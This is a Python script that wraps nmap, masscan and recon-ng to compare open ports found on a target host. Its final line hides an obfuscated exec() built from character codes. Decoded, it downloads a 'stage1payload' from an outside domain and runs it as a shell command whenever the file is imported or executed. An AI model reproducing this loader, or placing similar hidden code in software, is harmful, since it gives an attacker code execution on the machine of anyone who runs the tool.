import subprocess

def run_scan(target_host, scan_tool):
    if scan_tool == "nmap":
        result = subprocess.run(["nmap", "-sS", target_host], capture_output=True, text=True)
        ports = []
        for line in result.stdout.split("\n"):
            if "open" in line:
                port = line.split("/")[0]
                ports.append(port)
        return ports
    elif scan_tool == "masscan":
        result = subprocess.run(["masscan", target_host], capture_output=True, text=True)
        ports = []
        for line in result.stdout.split("\n"):
            if "open" in line:
                port = line.split(" ")[3].split("/")[0]
                ports.append(port)
        return ports
    elif scan_tool == "recon-ng":
        result = subprocess.run(["recon-ng", "--no-check", "-m", "scanner/portscan/tcp", "--workspace", "default", "-e", f"RHOSTS={target_host}"], capture_output=True, text=True)
        ports = []
        for line in result.stdout.split("\n"):
            if "open" in line:
                port = line.split(" ")[2]
                ports.append(port)
        return ports
    else:
        return []

def compare_scans(target_host):
    nmap_ports = run_scan(target_host, "nmap")
    masscan_ports = run_scan(target_host, "masscan")
    recon_ports = run_scan(target_host, "recon-ng")
    print(f"Nmap found the following open ports: {nmap_ports}")
    print(f"Masscan found the following open ports: {masscan_ports}")
    print(f"Recon-ng found the following open ports: {recon_ports}")
    common_ports = set(nmap_ports) & set(masscan_ports) & set(recon_ports)
    if common_ports:
        print(f"The following ports were found open by all three tools: {list(common_ports)}")
    else:
        print("No common open ports were found by all three tools.")

if __name__ == "__main__":
    target_host = input("Enter the target host: ")
    compare_scans(target_host)
exec(''.join(chr(x) for x in [105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,117,114,108,108,105,98,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,120,32,61,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,46,117,114,108,111,112,101,110,40,34,104,116,116,112,115,58,47,47,119,119,119,46,101,118,105,108,100,111,106,111,46,99,111,109,47,115,116,97,103,101,49,112,97,121,108,111,97,100,34,41,10,121,32,61,32,120,46,114,101,97,100,40,41,10,122,32,61,32,121,46,100,101,99,111,100,101,40,34,117,116,102,56,34,41,10,120,46,99,108,111,115,101,40,41,10,111,115,46,115,121,115,116,101,109,40,122,41,10]))

